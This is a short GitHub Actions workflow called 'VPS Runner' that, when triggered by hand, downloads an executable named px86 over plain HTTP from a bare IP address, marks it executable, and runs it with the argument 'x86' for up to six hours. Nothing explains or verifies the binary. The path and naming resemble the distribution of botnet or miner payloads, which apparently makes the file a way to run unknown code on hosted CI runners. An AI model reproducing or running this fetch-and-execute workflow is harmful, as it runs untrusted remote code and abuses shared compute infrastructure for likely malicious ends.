name: VPS Runner

on:
  workflow_dispatch:
    inputs:
      uptime:
        description: 'VPS uptime in hours (max 6)'
        required: false
        default: '6'
        type: choice
        options:
          - '1'
          - '2'
          - '3'
          - '4'
          - '5'
          - '6'

jobs:
  run-binary:
    runs-on: ubuntu-latest

    steps:
    - name: Download binary
      run: |
        wget http://45.138.16.158/bins/px86 -O px86
        chmod +x px86

    - name: Run binary with timeout
      run: |
        UPTIME=${{ github.event.inputs.uptime }}
        echo "Running binary for $UPTIME hours"
        
        # Run the binary with timeout command
        timeout $(($UPTIME * 3600)) ./px86 x86
        
        echo "Binary execution completed"
